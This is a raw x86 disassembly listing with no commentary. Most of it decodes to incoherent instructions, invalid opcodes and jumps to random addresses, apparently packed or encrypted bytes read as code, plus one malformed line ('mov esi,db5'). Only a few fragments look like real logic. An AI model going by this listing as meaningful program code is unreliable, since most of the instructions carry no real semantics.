  407d45:	add    al,0x32
  407d47:	dec    esp
  407d48:	pop    esi
  407d49:	cmp    ah,BYTE PTR ds:0x466d20e3
  407d4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d50:	imul   BYTE PTR [eax-0x5e]
  407d53:	mul    dl
  407d55:	leave  
  407d56:	push   ds
  407d57:	push   ss
  407d58:	sbb    eax,0x79b0882c
  407d5d:	xlat   BYTE PTR ds:[ebx]
  407d5e:	in     al,dx
  407d5f:	jmp    0x6c97632b
  407d64:	pop    esi
  407d65:	sbb    BYTE PTR [eax],bl
  407d67:	mov    dl,0x1b
  407d6a:	aad    0x42
  407d6c:	(bad)  
  407d6d:	aad    0x81
  407d6f:	cli    
  407d70:	adc    al,0x5b
  407d72:	xchg   ebx,eax
  407d73:	shl    al,1
  407d75:	mov    ecx,0x17daba5a
  407d7a:	sub    BYTE PTR [esi-0x1097b9c5],ah
  407d80:	(bad)  
  407d81:	mov    bl,0x3c
  407d83:	stc    
  407d84:	test   al,0x96
  407d86:	inc    ebp
  407d87:	das    
  407d88:	mov    bl,0x88
  407d8a:	loope  0x407dc8
  407d8c:	dec    ecx
  407d8d:	sbb    esp,DWORD PTR [esi]
  407d8f:	(bad)  
  407d90:	dec    edx
  407d91:	retf   
  407d92:	pop    ss
  407d93:	jmp    0xad3286a8
  407d98:	inc    esi
  407d99:	mov    ds:0x8d2595fb,eax
  407d9e:	addr16 pop ebx
  407da0:	retw   
  407da2:	jecxz  0x407d4e
  407da4:	test   BYTE PTR [esi+0x70b7eeef],bl
  407daa:	nop
  407dab:	ret    
  407dac:	outs   dx,DWORD PTR ds:[esi]
  407dad:	fdivr  st,st(0)
  407daf:	ret    
  407db0:	rcl    BYTE PTR [edi],cl
  407db2:	into   
  407db3:	out    dx,eax
  407db4:	mov    DWORD PTR [eax],esp
  407db6:	jne    0x407df1
  407db8:	pop    ss
  407db9:	mov    bl,0x1e
  407dbb:	(bad)  
  407dbc:	sbb    al,0xbe
  407dbe:	stc    
  407dbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407dc0:	call   0x2a2ace7c
  407dc5:	jl     0x407dd0
  407dc7:	cmovle esp,DWORD PTR [esi+eax*2-0x4ab1509b]
  407dcf:	inc    DWORD PTR [edi+0x35]
  407dd2:	inc    esp
  407dd3:	cmp    al,BYTE PTR [eax]
  407dd5:	sub    al,0xbc
  407dd7:	adc    eax,0x8ef25995
  407ddc:	mov    edx,0xb4fd84ec
  407de1:	cdq    
  407de2:	inc    ebp
  407de3:	icebp  
  407de4:	out    dx,eax
  407de5:	in     al,0x26
  407de7:	ret    
  407de8:	cld    
  407de9:	shl    cl,1
  407deb:	xchg   edi,eax
  407dec:	or     eax,0x941db961
  407df1:	mov    dl,0x81
  407df3:	jmp    0x407dae
  407df5:	jl     0x407de2
  407df7:	shl    BYTE PTR [ecx+0xa9b312a],0xe
  407dfe:	div    BYTE PTR [edi]
  407e00:	sbb    bl,0x37
  407e03:	sar    DWORD PTR [ecx],0xf4
  407e06:	fsubr  DWORD PTR [bp+di-0x33ef]
  407e0b:	sbb    eax,0x87966baf
  407e10:	ds cli 
  407e12:	pushf  
  407e13:	inc    ebp
  407e14:	xor    DWORD PTR [ecx-0x76857eaa],edx
  407e1a:	or     DWORD PTR [esi+0x48],0x3a
  407e1e:	arpl   WORD PTR [esp+eiz*4],bx
  407e21:	adc    al,0xbe
  407e23:	or     bh,BYTE PTR [edi+0xb1ec0b]
  407e29:	xor    eax,ecx
  407e2b:	pushf  
  407e2c:	sub    ebx,ebp
  407e2e:	in     eax,0x9d
  407e30:	push   ss
  407e31:	jecxz  0x407e8d
  407e33:	into   
  407e34:	adc    DWORD PTR [esi-0x58],ebx
  407e37:	js     0x407e28
  407e39:	inc    esi
  407e3a:	loop   0x407e29
  407e3c:	es inc esi
  407e3e:	leave  
  407e3f:	jecxz  0x407e32
  407e41:	sbb    BYTE PTR [eax+ebp*2],cl
  407e44:	popf   
  407e45:	ja     0x407eaa
  407e47:	xchg   edx,eax
  407e48:	sti    
  407e49:	add    eax,0xab8e403d
  407e4e:	les    edi,FWORD PTR [ecx-0x4924e522]
  407e54:	sbb    eax,0x79ba7f2c
  407e59:	lods   eax,DWORD PTR ds:[esi]
  407e5a:	mov    DWORD PTR [ebx+eax*8-0x30],edi
  407e5e:	jle    0x407e19
  407e60:	jae    0x407ed3
  407e62:	in     eax,dx
  407e63:	push   ecx
  407e64:	test   eax,0x219eb7ed
  407e69:	mov    ebx,0xa2b590f8
  407e6e:	in     eax,dx
  407e6f:	outs   dx,DWORD PTR ds:[esi]
  407e70:	mov    eax,0xff92af8
  407e75:	xchg   DWORD PTR [eax],ecx
  407e77:	add    BYTE PTR [eax],al
  407e79:	add    BYTE PTR [ebx-0x11162bab],cl
  407e7f:	or     BYTE PTR [eax],al
  407e81:	add    BYTE PTR [ebx+0x7d8bcc55],cl
  407e87:	cld    
  407e88:	xor    edx,eax
  407e8a:	xor    edi,eax
  407e8c:	jmp    0x40803d
  407e91:	(bad)  
  407e92:	in     al,dx
  407e93:	test   eax,0x4771b1f1
  407e98:	call   0x1b74fcaf
  407e9d:	icebp  
  407e9e:	push   ds
  407e9f:	repz adc dl,BYTE PTR [ecx]
  407ea2:	int    0x7e
  407ea4:	jle    0x407e30
  407ea6:	jg     0x407f26
  407ea8:	jle    0x407e3f
  407eaa:	adc    BYTE PTR [esi-0x4f],dh
  407ead:	ror    BYTE PTR [edx+edx*4],cl
  407eb0:	xor    BYTE PTR [edx+0xda14c41],cl
  407eb6:	out    0x51,al
  407eb8:	mov    bl,0xb5
  407eba:	push   0x1c
  407ebc:	pop    ss
  407ebd:	cmc    
  407ebe:	shl    BYTE PTR [eax-0x55],cl
  407ec1:	fcmovb st,st(4)
  407ec3:	sub    al,0x4
  407ec5:	mov    dh,0xa3
  407ec7:	xor    eax,0xda4fd62a
  407ecc:	push   eax
  407ecd:	push   ecx
  407ece:	test   eax,0x3af4489e
  407ed3:	arpl   WORD PTR [eax-0x190d8eb7],sp
  407ed9:	leave  
  407eda:	dec    edx
  407edb:	js     0x407ec3
  407edd:	xlat   BYTE PTR ds:[ebx]
  407ede:	mov    cl,0x7e
  407ee0:	ret    0xd28c
  407ee3:	pop    eax
  407ee4:	jecxz  0x407f07
  407ee6:	xchg   esp,eax
  407ee7:	das    
  407ee8:	xchg   esp,eax
  407ee9:	add    eax,0x1ed34afa
  407eee:	sub    edx,DWORD PTR [edx-0x2595bd32]
  407ef4:	mov    ah,0x45
  407ef6:	scas   eax,DWORD PTR es:[edi]
  407ef7:	mov    ds:0x63be194d,eax
  407efc:	cmp    eax,0xabe4c900
  407f01:	out    0xa3,eax
  407f03:	xchg   ebx,eax
  407f04:	daa    
  407f05:	mov    ch,0x22
  407f07:	stos   DWORD PTR es:[edi],eax
  407f08:	pop    ds
  407f09:	push   0x8813d84b
  407f0e:	dec    ebp
  407f0f:	scas   eax,DWORD PTR es:[edi]
  407f10:	and    BYTE PTR [ecx+0x2a],ch
  407f13:	shl    BYTE PTR [ebx],1
  407f15:	fdiv   st(7),st
  407f17:	push   cs
  407f18:	adc    DWORD PTR [edx+0x78],edx
  407f1b:	xchg   ebp,eax
  407f1c:	and    dh,bl
  407f1e:	mov    DWORD PTR [edi+0x25],ecx
  407f21:	ins    DWORD PTR es:[edi],dx
  407f22:	mov    eax,0x6904039f
  407f27:	and    eax,0x2abbc82e
  407f2c:	fmulp  st(7),st
  407f2e:	sbb    al,0x44
  407f30:	push   edi
  407f31:	test   eax,0xc327ec15
  407f36:	out    dx,al
  407f37:	frstor [ecx-0xb]
  407f3a:	mov    al,ds:0x514b4797
  407f3f:	xor    BYTE PTR [eax+0x39a3bb20],dh
  407f45:	mov    dl,0x76
  407f47:	popa   
  407f48:	push   ds
  407f49:	push   esi
  407f4a:	fist   DWORD PTR ds:0xdc12dd8a
  407f50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f51:	cs push ss
  407f53:	fisttp DWORD PTR [esi+eiz*8+0x40]
  407f57:	(bad)  
  407f58:	fcomp  QWORD PTR [edx+0x5e]
  407f5b:	call   0x5ea76fa2
  407f60:	sub    al,0xbc
  407f62:	shr    DWORD PTR ds:0x1babb2ca,0x5b
  407f69:	add    BYTE PTR [eax+0x7a],dl
  407f6c:	xchg   DWORD PTR [ecx+edi*1],esp
  407f6f:	(bad)  [eax-0x45e86b20]
  407f75:	in     al,dx
  407f76:	cwde   
  407f77:	xor    al,0x54
  407f79:	fst    DWORD PTR ds:0x6849ee4e
  407f7f:	arpl   bx,ax
  407f81:	sbb    esi,DWORD PTR [ecx-0x67]
  407f84:	mov    ebx,0x175b56b1
  407f89:	pop    esp
  407f8a:	sub    BYTE PTR [edi-0x41],0x4e
  407f8e:	jge    0x407f51
  407f90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f91:	sbb    al,0xf7
  407f93:	jno    0x407fe9
  407f95:	mov    dl,0x3
  407f97:	mov    ds:0xb940f756,eax
  407f9c:	dec    ebp
  407f9d:	int3   
  407f9e:	jno    0x408006
  407fa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fa1:	sub    DWORD PTR [ebp-0x6bc2bc9d],esp
  407fa7:	cdq    
  407fa8:	and    al,0x95
  407faa:	pop    edx
  407fab:	jmp    0xa53f:0xf8d15efe
  407fb2:	sbb    al,0x71
  407fb4:	xor    cl,BYTE PTR [eax]
  407fb6:	js     0x407fe8
  407fb8:	rol    BYTE PTR [ebx-0xf],0xb5
  407fbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fbd:	loopne 0x407feb
  407fbf:	das    
  407fc0:	call   0xb2479b3b
  407fc5:	jo     0x407ffd
  407fc7:	outs   dx,DWORD PTR ds:[esi]
  407fc8:	lds    eax,FWORD PTR [ebx]
  407fca:	mov    esp,0x4ddf8a08
  407fcf:	pop    ebx
  407fd0:	out    dx,al
  407fd1:	into   
  407fd2:	jnp    0x407f81
  407fd4:	pusha  
  407fd5:	inc    ebp
  407fd6:	(bad)  
  407fd7:	mov    edi,0xfc31ea0f
  407fdc:	mov    ecx,0xc1d16e5a
  407fe1:	neg    BYTE PTR [edi]
  407fe3:	out    0x9a,eax
  407fe5:	mov    al,ds:0xde9f57c7
  407fea:	das    
  407feb:	hlt    
  407fec:	int    0xea
  407fee:	and    al,0x9e
  407ff0:	and    BYTE PTR [ebx],dl
  407ff2:	int    0x35
  407ff4:	(bad)  
  407ff5:	adc    dh,BYTE PTR [ecx-0x14]
  407ff8:	mov    bh,0xb3
  407ffa:	sbb    edx,edi
  407ffc:	addr16 into 
  407ffe:	fistp  QWORD PTR [edx+0x79d52806]
  408004:	or     al,0x36
  408006:	and    esi,0xfffffff5
  408009:	adc    esi,DWORD PTR [eax-0x5]
  40800c:	mov    dl,0x9f
  40800e:	sti    
  40800f:	jp     0x408018
  408011:	clc    
  408012:	xchg   ebx,eax
  408013:	sbb    al,0x43
  408015:	mov    edx,0xc29ab166
  40801a:	retf   
  40801b:	push   edi
  40801c:	pop    ebp
  40801d:	in     eax,0x30
  40801f:	pop    edx
  408020:	and    bh,BYTE PTR [ebp+0x1cea00da]
  408026:	(bad)  
  408027:	cld    
  408028:	imul   esi,DWORD PTR [esi+0x13],0x0
  40802c:	adc    BYTE PTR [eax+0x3c8198e6],bh
  408032:	jne    0x407fc9
  408034:	inc    edi
  408035:	pop    ebx
  408036:	sub    edi,DWORD PTR [edx-0x6a]
  408039:	or     BYTE PTR [eax+ebp*2+0x6b],0x3
  40803e:	stc    
  40803f:	add    edx,ecx
  408041:	imul   edx,edi
  408044:	mov    edi,DWORD PTR [ebp-0x8]
  408047:	mov    ebx,DWORD PTR [ebp-0x10]
  40804a:	sub    ebx,edi
  40804c:	cmp    ebx,edx
  40804e:	ja     0x40805c
  408054:	mov    edx,DWORD PTR [ebp-0x30]
  408057:	jmp    0x408770
  40805c:	mov    edx,DWORD PTR [ebp-0x38]
  40805f:	mov    edi,DWORD PTR [ebp-0x4]
  408062:	xor    edx,eax
  408064:	xor    edi,eax
  408066:	add    edi,ecx
  408068:	jmp    0x408219
  40806d:	jmp    0x958e95d5
  408072:	push   0x185c6171
  408077:	mov    ch,0xe0
  408079:	sub    dh,BYTE PTR [ebp-0x78]
  40807c:	pop    esp
  40807d:	lods   eax,DWORD PTR ds:[esi]
  40807e:	retf   0x7e7e
  408081:	mov    bh,BYTE PTR [edi+0x7e]
  408084:	jle    0x4080c4
  408086:	cld    
  408087:	cdq    
  408088:	ss push 0x9d13f24b
  40808e:	scas   eax,DWORD PTR es:[edi]
  40808f:	jecxz  0x4080be
  408091:	shr    BYTE PTR [esi],0xce
  408094:	imul   BYTE PTR [ecx+esi*8+0x38]
  408098:	pop    ds
  408099:	jle    0x40806d
  40809b:	ins    BYTE PTR es:[edi],dx
  40809c:	cli    
  40809d:	ret    
  40809e:	xchg   ecx,eax
  40809f:	enter  0xfca6,0x7e
  4080a3:	dec    ebx
  4080a4:	loopne 0x4080f8
  4080a6:	enter  0xa76f,0x8b
  4080aa:	xor    ah,BYTE PTR [edi+0x14]
  4080ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080ae:	xor    cl,bh
  4080b0:	daa    
  4080b1:	jbe    0x4080d2
  4080b3:	push   esp
  4080b4:	mov    ah,BYTE PTR [ebx]
  4080b6:	or     edi,DWORD PTR [ebp-0x58]
  4080b9:	fnstsw WORD PTR [ebx-0x75c81ae6]
  4080bf:	sahf   
  4080c0:	and    DWORD PTR [ebp-0x4],ecx
  4080c3:	gs inc edi
  4080c5:	aad    0x22
  4080c7:	mov    cl,0x4e
  4080c9:	mov    ss,WORD PTR [eax+eax*4-0x7e49bec9]
  4080d0:	loope  0x408083
  4080d2:	outs   dx,DWORD PTR ds:[esi]
  4080d3:	sub    BYTE PTR [esi+0x2e],0x68
  4080d7:	jecxz  0x4080c4
  4080d9:	xchg   ebx,eax
  4080da:	in     eax,dx
  4080db:	inc    edx
  4080dc:	add    eax,0x9a911bcb
  4080e1:	mov    ebx,0x870599f7
  4080e6:	es push ss
  4080e8:	popaw  
  4080ea:	inc    ebx
  4080eb:	fild   WORD PTR [ecx-0x7258e80e]
  4080f1:	imul   esi,ebp,0x16e895dc
  4080f7:	push   esi
  4080f8:	dec    esp
  4080f9:	dec    edi
  4080fa:	js     0x4080ab
  4080fc:	mov    esi,0xd9fcee19
  408101:	pushf  
  408102:	test   eax,0xa459c8f3
  408107:	push   0xc48b4d1e
  40810c:	cwde   
  40810d:	in     al,dx
  40810e:	add    BYTE PTR [edi+0x24],bl
  408111:	mov    edx,0x2f5eeebf
  408116:	stos   BYTE PTR es:[edi],al
  408117:	push   0xfffffffc
  408119:	push   esp
  40811a:	inc    eax
  40811b:	int3   
  40811c:	push   edi
  40811d:	ja     0x4080dc
  40811f:	shr    ch,1
  408121:	retf   
  408122:	xchg   edi,eax
  408123:	inc    ebp
  408124:	sbb    BYTE PTR [edi],bh
  408126:	cmp    eax,0xe827450c
  40812b:	std    
  40812c:	mov    cl,BYTE PTR [ecx-0x19]
  40812f:	dec    ecx
  408130:	stos   BYTE PTR es:[edi],al
  408131:	xchg   edx,eax
  408132:	xchg   esi,eax
  408133:	push   eax
  408134:	fistp  DWORD PTR [ecx-0x4c]
  408137:	jge    0x4080e7
  408139:	jecxz  0x40818e
  40813b:	jmp    0x2161:0xc4f5a524
  408142:	iret   
  408143:	jmp    0x40815a
  408145:	push   ecx
  408146:	add    BYTE PTR [ebp-0x4f],cl
  408149:	out    dx,eax
  40814a:	or     al,BYTE PTR [ebx-0x30]
  40814d:	adc    al,0xbc
  40814f:	xchg   DWORD PTR [ebp+0x5f97a8ec],edx
  408155:	ret    
  408156:	mov    ebp,0xf6bc13b0
  40815b:	cli    
  40815c:	ret    0x7c7f
  40815f:	gs out dx,eax
  408161:	ret    
  408162:	ins    BYTE PTR es:[edi],dx
  408163:	push   ss
  408164:	popa   
  408165:	out    dx,eax
  408166:	and    bl,BYTE PTR [edx+0x67b1b9ff]
  40816c:	mov    ah,0xe7
  40816e:	mov    ecx,esp
  408170:	sbb    BYTE PTR [ebx-0x25],bl
  408173:	fs clc 
  408175:	pop    ebx
  408176:	jnp    0x408151
  408178:	mov    bl,0xc1
  40817a:	int    0x41
  40817c:	cmp    al,0x1f
  40817e:	test   DWORD PTR [esi+0x10820dc7],esi
  408184:	out    0xc0,al
  408186:	call   0xc6906757
  40818b:	test   eax,0x4db721ff
  408190:	adc    bh,BYTE PTR [eax+0x4]
  408193:	adc    al,0x7f
  408195:	pop    ds
  408196:	ss imul ebp,ebp,0x9ff0fa41
  40819d:	out    0xb3,eax
  40819f:	or     esi,DWORD PTR [edx]
  4081a1:	repnz (bad) 
  4081a3:	dec    esp
  4081a4:	sub    al,0xee
  4081a6:	sub    al,0x84
  4081a8:	sub    DWORD PTR [ebx+0x58],ebx
  4081ab:	aad    0x33
  4081ad:	inc    esp
  4081ae:	adc    BYTE PTR ds:0xf32b123b,al
  4081b4:	adc    ch,BYTE PTR [eax+0x18]
  4081b7:	mov    eax,ds:0x1b1001f2
  4081bc:	das    
  4081bd:	adc    cl,dh
  4081bf:	mov    ecx,0x34d547dc
  4081c4:	and    edi,ebp
  4081c6:	mov    eax,ds:0xa6934d76
  4081cb:	sub    dl,ah
  4081cd:	xchg   ebx,eax
  4081ce:	std    
  4081cf:	in     al,0x6
  4081d1:	int3   
  4081d2:	and    DWORD PTR [esi+0x465f3705],edx
  4081d8:	test   eax,esi
  4081da:	pop    ecx
  4081db:	cld    
  4081dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081dd:	(bad)  
  4081de:	jbe    0x4081ac
  4081e0:	and    al,0x77
  4081e2:	rol    BYTE PTR ds:0x992dc49f,cl
  4081e8:	retf   
  4081e9:	call   0xea02:0x26108a18
  4081f0:	ds push esp
  4081f2:	mov    eax,ds:0x18f481ca
  4081f7:	and    cl,dl
  4081f9:	jno    0x4081ad
  4081fb:	xchg   esi,eax
  4081fc:	mov    ds:0xd28e0522,al
  408201:	sbb    ebp,DWORD PTR [esp+ebx*8]
  408204:	cdq    
  408205:	mov    edi,0xb1b6420a
  40820a:	in     al,0x4e
  40820c:	xchg   esi,eax
  40820d:	push   esi
  40820e:	in     eax,dx
  40820f:	aaa    
  408210:	cwde   
  408211:	pusha  
  408212:	popa   
  408213:	jae    0x4081a7
  408215:	dec    ebx
  408216:	sbb    DWORD PTR [eax],esp
  408218:	add    DWORD PTR [ebx],0x1ace9d1
  40821e:	add    BYTE PTR [eax],al
  408220:	dec    esp
  408221:	adc    BYTE PTR [edi],bh
  408223:	add    eax,DWORD PTR [ebx-0x2f]
  408226:	push   eax
  408227:	push   ecx
  408228:	jl     0x4082a4
  40822a:	jmp    0x3907:0xc43ff662
  408231:	enter  0x7e7e,0x8a
  408235:	jg     0x4082b5
  408237:	jle    0x408248
  408239:	repz jge 0x4081f8
  40823c:	sub    eax,0x25780247
  408241:	xor    esi,DWORD PTR [eax-0x80]
  408244:	fistp  DWORD PTR [esi+0x6a]
  408247:	sub    ebx,DWORD PTR [edi-0x71550e78]
  40824d:	loop   0x408245
  40824f:	(bad)  
  408251:	fadd   DWORD PTR [ecx*1+0x5f2d7927]
  408258:	cdq    
  408259:	ror    DWORD PTR ds:[ecx],1
  40825c:	test   DWORD PTR [ebx+0x74],edx
  40825f:	pushf  
  408260:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408261:	jne    0x4082c1
  408263:	fnstsw WORD PTR [ebp-0x1b4fc44b]
  408269:	xchg   BYTE PTR cs:[ebp-0x74],bl
  40826d:	test   al,0x3f
  40826f:	inc    ebx
  408270:	push   ds
  408271:	test   eax,0x19b117ee
  408276:	aad    0xde
  408278:	cmp    dh,BYTE PTR [esi-0x19e991f3]
  40827e:	not    DWORD PTR [eax]
  408280:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408281:	stos   DWORD PTR es:[edi],eax
  408282:	adc    BYTE PTR [esi-0x38718330],al
  408288:	inc    ecx
  408289:	xchg   BYTE PTR [edi],al
  40828b:	das    
  40828c:	shl    BYTE PTR [esp+ecx*8],1
  40828f:	jo     0x408265
  408291:	jo     0x408242
  408293:	mov    ecx,0xc4677376
  408298:	repnz (bad) 
  40829a:	loope  0x4082b4
  40829c:	in     eax,0x84
  40829e:	imul   ebp,DWORD PTR [ebx+0x61],0x3e
  4082a2:	loopne 0x408280
  4082a4:	mov    ecx,0xae83e5e
  4082a9:	test   BYTE PTR [ebx],0xac
  4082ac:	not    DWORD PTR [edi+edx*1-0x227ee99f]
  4082b3:	jno    0x40825c
  4082b5:	gs or  esi,ebp
  4082b8:	pop    ebp
  4082b9:	lea    esp,[esi-0x4e]
  4082bc:	cld    
  4082bd:	icebp  
  4082be:	fwait
  4082bf:	mov    bh,0x6a
  4082c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082c2:	bswap  ebx
  4082c4:	jge    0x40832f
  4082c6:	rcl    BYTE PTR [eax+edx*8-0x5d6c61c0],0xfa
  4082ce:	sub    al,0x39
  4082d0:	jne    0x4082fa
  4082d2:	sti    
  4082d3:	add    al,0x99
  4082d5:	xchg   edx,eax
  4082d6:	pop    esp
  4082d7:	xor    ch,BYTE PTR [ecx-0x22bff7e]
  4082dd:	cld    
  4082de:	sub    DWORD PTR [ecx+eiz*1-0x5608f05e],esp
  4082e5:	jo     0x40832f
  4082e7:	iret   
  4082e8:	enter  0x4828,0x3f
  4082ec:	mov    esi,db5
  4082ef:	cmp    ecx,DWORD PTR [eax]
  4082f1:	pop    esp
  4082f2:	lds    edi,FWORD PTR cs:[esi+0x93f26da]
  4082f9:	into   
  4082fa:	jg     0x408361
  4082fc:	jb     0x4082e9
  4082fe:	in     eax,0xa7
  408300:	outs   dx,DWORD PTR ds:[esi]
  408301:	jp     0x4082dd
  408303:	xchg   esp,eax
  408304:	pusha  
  408305:	imul   esp,DWORD PTR [ecx+0x3fd73ffb],0xcd8c31dc
  40830f:	adc    eax,DWORD PTR [eax]
  408311:	xchg   esi,eax
  408312:	jmp    0x8e45cc32
  408317:	cs ja  0x408397
  40831a:	inc    esi
  40831b:	shl    BYTE PTR [esi],0xf7
  40831e:	and    ch,BYTE PTR [esi+0x6f720898]
  408324:	jecxz  0x4082f7
  408326:	out    0xe5,al
  408328:	mov    ah,BYTE PTR [ecx-0x61486e2b]
  40832e:	sub    DWORD PTR [edi],edx
  408330:	dec    edi
  408331:	repnz int 0xba
  408334:	xchg   ecx,eax
  408335:	and    WORD PTR [edx-0x6b],si
  408339:	adc    BYTE PTR [edi],ch
  40833b:	jmp    0xcb1e:0x979fd867
  408342:	lods   eax,DWORD PTR ds:[esi]
  408343:	lea    esi,[edx]
  408345:	stos   DWORD PTR es:[edi],eax
  408346:	mov    ds:0xedc4b0ae,al
  40834b:	inc    esi
  40834c:	js     0x408350
  40834e:	das    
  40834f:	sub    al,0x9
  408351:	add    al,0x81
  408353:	cmp    al,0x63
  408355:	in     al,0x5c
  408357:	add    BYTE PTR [eax+0x52],cl
  40835a:	xchg   esp,eax
  40835b:	jno    0x408333
  40835d:	sub    al,0x7
  40835f:	je     0x408383
  408361:	and    ebx,DWORD PTR [ebx]
  408363:	test   eax,0xa13a78c
  408368:	es out dx,al
  40836a:	xlat   BYTE PTR ds:[ebx]
  40836b:	popf   
  40836c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40836d:	push   eax
  40836e:	xchg   DWORD PTR [edx-0x6],ebx
  408371:	or     ebx,DWORD PTR [edi-0x39a9f346]
  408377:	adc    esi,DWORD PTR [edx+0x74]
  40837a:	push   ecx
  40837b:	mov    eax,ds:0x57ffb991
  408380:	in     al,dx
  408381:	push   0x1c
  408383:	lods   al,BYTE PTR ds:[esi]
  408384:	jle    0x408350
  408386:	push   ss
  408387:	add    bl,BYTE PTR [esi]
  408389:	test   DWORD PTR [edi+ebx*4],eax
  40838c:	adc    eax,0x1580238
  408391:	sti    
  408392:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408393:	xchg   DWORD PTR [eax+0x5b9c19c8],ebx
  408399:	xchg   edx,eax
  40839a:	fyl2xp1 
  40839c:	add    eax,esp
  40839e:	out    0x34,eax
  4083a0:	lods   eax,DWORD PTR ds:[esi]
  4083a1:	(bad)  
  4083a3:	aad    0x5
  4083a5:	sub    ch,bl
  4083a7:	xor    eax,DWORD PTR [edi+0xc]
  4083aa:	jno    0x4083c8
  4083ac:	jno    0x40839f
  4083ae:	das    
  4083af:	mov    esi,0x691335ea
  4083b4:	cmc    
  4083b5:	adc    DWORD PTR [edx+ebx*8+0xc7856d5],ecx
  4083bc:	pop    ecx
  4083bd:	mov    cl,0x69
  4083bf:	dec    edx
  4083c0:	and    eax,0x34d7080c
  4083c5:	and    eax,0xce4f1ec4
  4083ca:	pop    eax
  4083cb:	mov    bl,0xf
  4083cd:	scas   eax,DWORD PTR es:[edi]
  4083ce:	xlat   BYTE PTR ds:[ebx]
  4083cf:	mov    edi,DWORD PTR [ebp-0x8]
  4083d2:	mov    ebx,DWORD PTR [ebp-0x10]
  4083d5:	sub    ebx,edi
  4083d7:	jmp    0x408588
  4083dc:	and    BYTE PTR [ebx-0x6c4aede2],ch
  4083e2:	xor    BYTE PTR [ecx-0x29441d92],ch
  4083e8:	mov    ecx,0x55d3fc0c
  4083ed:	leave  
  4083ee:	jle    0x40846e
  4083f0:	mov    bh,BYTE PTR [edi+0x7e]
  4083f3:	jle    0x40838d
  4083f5:	je     0x40846b
  4083f7:	push   eax
  4083f8:	jl     0x4083d4
  4083fa:	and    al,0x40
  4083fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083fd:	sbb    BYTE PTR [ebp-0x777b8911],dl
  408403:	arpl   WORD PTR [ebx-0x3e],ax
  408406:	xor    BYTE PTR [edi-0x34c7e8e8],bl
  40840c:	cdq    
  40840d:	pop    esp
  40840e:	leave  
  40840f:	test   BYTE PTR [ecx],cl
  408411:	aad    0x7a
  408413:	dec    ecx
  408414:	out    0xc2,eax
  408416:	shl    BYTE PTR [ecx],cl
  408418:	repnz in al,0xaa
  40841b:	fisttp QWORD PTR ds:0x3dcef88
  408421:	sub    al,0xa6
  408423:	add    bh,bl
  408425:	mov    bl,0x2
  408427:	add    al,0x71
  408429:	aad    0x35
  40842b:	dec    ebx
  40842c:	pushf  
  40842d:	xor    ah,BYTE PTR [ebp+0x5834f283]
  408433:	and    eax,0x9bb74ee1
  408438:	xor    bh,BYTE PTR [eax+ebp*1-0x2d]
  40843c:	adc    edx,edi
  40843e:	ror    ch,1
  408440:	loop   0x40847a
  408442:	xchg   edi,eax
  408443:	std    
  408444:	ins    DWORD PTR es:[edi],dx
  408445:	add    al,BYTE PTR [ecx-0x3c]
  408448:	mov    eax,0x52863d63
  40844d:	push   0x9736524a
  408452:	out    0x76,al
  408454:	ja     0x4084b8
  408456:	in     al,dx
  408457:	stos   BYTE PTR es:[edi],al
  408458:	and    dh,bh
  40845a:	mov    esi,0xe468eb4b
  40845f:	repnz mov ebx,0x6691e741
  408465:	or     edi,DWORD PTR ss:[edi+0x403f4476]
  40846c:	pop    ecx
  40846d:	jle    0x40840b
  40846f:	dec    edx
  408470:	sahf   
  408471:	stos   BYTE PTR es:[edi],al
  408472:	pop    eax
  408473:	add    BYTE PTR [ebx-0x5c],cl
  408476:	mov    dh,0x7f
  408478:	retf   0xde1e
  40847b:	or     BYTE PTR [ebx-0x598ec555],bl
  408481:	fisttp QWORD PTR [ecx-0x668f64e6]
  408487:	mov    ebx,ds
  408489:	shl    ebx,0xc7
  40848c:	inc    esp
  40848d:	xrelease xchg BYTE PTR [edi+0x55865577],ah
  408494:	dec    eax
  408495:	sub    eax,0x9718484f
  40849a:	out    dx,al
  40849b:	stos   BYTE PTR es:[edi],al
  40849c:	mov    ch,dl
  40849e:	cmp    BYTE PTR [edi-0x4faf9c24],dh
  4084a4:	mov    al,ds:0xbfde51b1
  4084a9:	shr    BYTE PTR [eax+0x12],1
  4084ac:	ins    DWORD PTR es:[edi],dx
  4084ad:	xchg   ebp,eax
  4084ae:	inc    edx
  4084af:	push   ebp
  4084b0:	mov    ebp,0xb7fe2208
  4084b5:	and    BYTE PTR gs:[eax+0x622b596f],0xfa
  4084bd:	mov    esp,DWORD PTR es:[eax-0x15]
  4084c1:	lods   al,BYTE PTR ds:[esi]
  4084c2:	mov    WORD PTR [edi-0x3c],es
  4084c5:	mov    dh,0xfe
  4084c7:	ins    DWORD PTR es:[edi],dx
  4084c8:	mov    dh,0x68
  4084ca:	jne    0x4084d1
  4084cc:	push   0x79
  4084ce:	cmp    eax,0x748a8285
  4084d3:	sub    BYTE PTR [ebx+ebx*4-0x2503abd1],bh
  4084da:	adc    BYTE PTR [esi+0x10],dh
  4084dd:	mov    ds:0x18ef4e62,eax
  4084e2:	dec    esi
  4084e3:	sbb    al,0xe9
  4084e5:	jle    0x4084d1
  4084e7:	xor    eax,0xf7068f89
  4084ec:	or     eax,0xe8f6a301
  4084f1:	gs inc eax
  4084f3:	jne    0x4084af
  4084f5:	in     eax,0xf3
  4084f7:	jg     0x408502
  4084f9:	push   eax
  4084fa:	mov    eax,ds:0xc566241b
  4084ff:	push   es
  408500:	lods   eax,DWORD PTR ds:[esi]
  408501:	jmp    0x1c32cd17
  408506:	jmp    0x8c76434e
  40850b:	call   0x9523e665
  408510:	loop   0x40856a
  408512:	sub    DWORD PTR [ebp-0x3b146615],0xa743492f
  40851c:	sub    DWORD PTR [eax-0x7bb09cef],esp
  408522:	or     ah,BYTE PTR [ecx+0x6b8031ed]
